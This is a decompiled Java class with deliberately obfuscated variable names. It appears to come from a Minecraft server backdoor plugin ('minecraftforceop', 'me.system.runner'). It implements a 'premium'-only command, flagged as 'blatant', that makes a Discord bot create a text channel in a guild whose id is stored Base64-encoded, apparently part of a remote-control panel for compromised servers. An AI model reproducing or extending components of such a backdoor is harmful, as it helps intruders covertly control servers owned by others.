/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import com.minecraftforceop.jda.jda.api.entities.Guild;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class CreatetcCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIlIIllIIlllIIIlIlIl, String lllllllllllllIlIIllIIlllIIIlIlII, String[] lllllllllllllIlIIllIIlllIIIlIIll, Player lllllllllllllIlIIllIIlllIIIlIIlI) {
        if (lllllllllllllIlIIllIIlllIIIlIlIl.premium.contains(lllllllllllllIlIIllIIlllIIIlIIlI.getName())) {
            if (lllllllllllllIlIIllIIlllIIIlIlIl.botEnabled) {
                byte[] lllllllllllllIlIIllIIlllIIIllIII = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild lllllllllllllIlIIllIIlllIIIlIlll = lllllllllllllIlIIllIIlllIIIlIlIl.jda.getGuildById(new String(lllllllllllllIlIIllIIlllIIIllIII));
                if (lllllllllllllIlIIllIIlllIIIlIlll == null) {
                    lllllllllllllIlIIllIIlllIIIlIIlI.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else {
                    if (lllllllllllllIlIIllIIlllIIIlIIll.length <= 1) {
                        lllllllllllllIlIIllIIlllIIIlIlll.createTextChannel("Wendellmeset").complete();
                    } else {
                        lllllllllllllIlIIllIIlllIIIlIlll.createTextChannel(lllllllllllllIlIIllIIlllIIIlIIll[1]).complete();
                    }
                    lllllllllllllIlIIllIIlllIIIlIIlI.sendMessage(Settings.PREFIX("New channel created!"));
                }
            } else {
                lllllllllllllIlIIllIIlllIIIlIIlI.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            lllllllllllllIlIIllIIlllIIIlIIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    public CreatetcCommand() {
        CreatetcCommand lllllllllllllIlIIllIIlllIIllllIl;
    }
}

